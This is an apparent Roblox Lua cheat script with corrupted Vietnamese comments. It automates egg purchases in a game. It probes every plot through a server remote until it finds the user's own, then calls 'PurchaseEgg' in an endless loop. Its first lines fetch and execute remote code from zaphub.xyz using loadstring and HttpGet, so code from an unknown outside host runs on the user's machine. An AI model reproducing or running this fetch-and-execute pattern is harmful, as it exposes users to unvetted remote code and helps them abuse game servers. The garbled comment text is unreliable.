script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
-- CONFIG
local DELAY_BETWEEN_SCAN_CALLS = 0.1   -- gi√¢y gi·ªØa m·ªói call khi qu√©t c√°c plot
local SCAN_INTERVAL = 10               -- gi√¢y gi·ªØa m·ªói l·∫ßn qu√©t l·∫°i
local STOP_ON_FIRST_FOUND = true       -- d·ª´ng qu√©t ngay khi t√¨m plot kh·∫£ d·ª•ng
local PRINT_VERBOSE = true             -- in log chi ti·∫øt

-- ‚è≥ Delay ri√™ng cho t·ª´ng tr·ª©ng
local EGG_DELAYS = {
    [1] = 0.1,  -- Delay cho tr·ª©ng 1
    [2] = 80,  -- Delay cho tr·ª©ng 2
    [3] = 300,  -- Delay cho tr·ª©ng 3
}

-- SERVICES / PATHS
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlotsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
local Plots_Invoke = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Plots_Invoke")

local LocalPlayer = Players.LocalPlayer

-- helper: ki·ªÉm tra ph·∫£n h·ªìi server c√≥ h·ª£p l·ªá hay kh√¥ng
local function isValidResponse(res, ok)
    if not ok then
        return false
    end
    if res == nil or res == false then
        return false
    end
    return true
end

-- scan t·∫•t c·∫£ plot hi·ªán c√≥ trong workspace.__THINGS.Plots
local function scanPlotsAndFindMine()
    if PRINT_VERBOSE then print("üîç B·∫Øt ƒë·∫ßu qu√©t c√°c plot trong workspace.__THINGS.Plots ...") end

    for _, plot in ipairs(PlotsFolder:GetChildren()) do
        local plotId = plot:GetAttribute("ID") or plot:GetAttribute("PlotID") or tonumber(plot.Name) or plot.Name
        local idNum = tonumber(plotId) or plotId

        if PRINT_VERBOSE then print(("  - Th·ª≠ plot %s"):format(tostring(idNum))) end

        local args = {
            idNum,
            "PurchaseEgg",
            1,
            3
        }

        local ok, res = pcall(function()
            return Plots_Invoke:InvokeServer(unpack(args))
        end)

        if isValidResponse(res, ok) then
            print(("‚úÖ Plot kh·∫£ d·ª•ng ph√°t hi·ªán: %s  | Resp: %s"):format(tostring(idNum), tostring(res)))
            return idNum
        else
            if PRINT_VERBOSE then
                print(("   ‚úñ Kh√¥ng ph·∫£i plot c·ªßa b·∫°n: %s  | ok=%s res=%s"):format(tostring(idNum), tostring(ok), tostring(res)))
            end
        end

        task.wait(DELAY_BETWEEN_SCAN_CALLS)
    end

    print("üîé Qu√©t xong, kh√¥ng t√¨m ƒë∆∞·ª£c plot kh·∫£ d·ª•ng.")
    return nil
end

-- spam mua li√™n t·ª•c cho plotId ƒë√£ t√¨m ƒë∆∞·ª£c
local function spamPurchase(plotId)
    if not plotId then return end
    print(("üöÄ B·∫Øt ƒë·∫ßu spam mua tr·ª©ng 1‚Äì3 cho plot %s ‚Äî d·ª´ng b·∫±ng c√°ch tho√°t script"):format(tostring(plotId)))

    while true do
        -- ü•ö L·∫∑p qua t·ª´ng tr·ª©ng v·ªõi delay ri√™ng bi·ªát
        for eggSlot = 1, 3 do
            local args = { plotId, "PurchaseEgg", eggSlot, 3 }

            local ok, res = pcall(function()
                return Plots_Invoke:InvokeServer(unpack(args))
            end)

            if ok then
                print(("‚úÖ Mua th√†nh c√¥ng tr·ª©ng #%d (resp=%s) t·∫°i plot %s"):format(eggSlot, tostring(res), tostring(plotId)))
            else
                warn(("‚ö†Ô∏è L·ªói khi mua tr·ª©ng #%d t·∫°i plot %s -> %s"):format(eggSlot, tostring(plotId), tostring(res)))
            end

            -- üïí delay ri√™ng cho t·ª´ng tr·ª©ng
            task.wait(EGG_DELAYS[eggSlot] or 0.2)
        end
    end
end

-- MAIN LOOP: qu√©t l·∫°i m·ªói SCAN_INTERVAL gi√¢y cho ƒë·∫øn khi t√¨m th·∫•y plot
task.spawn(function()
    while true do
        local foundPlot = scanPlotsAndFindMine()
        if foundPlot then
            print("‚úÖ ƒê√£ t√¨m th·∫•y plot c·ªßa b·∫°n, b·∫Øt ƒë·∫ßu spam mua tr·ª©ng...")
            spamPurchase(foundPlot)
            break -- ng·ª´ng v√≤ng l·∫∑p ch√≠nh sau khi t√¨m th·∫•y
        else
            print(("‚è≥ Kh√¥ng t√¨m th·∫•y plot kh·∫£ d·ª•ng, th·ª≠ l·∫°i sau %s gi√¢y..."):format(SCAN_INTERVAL))
            task.wait(SCAN_INTERVAL)
        end
    end
end)

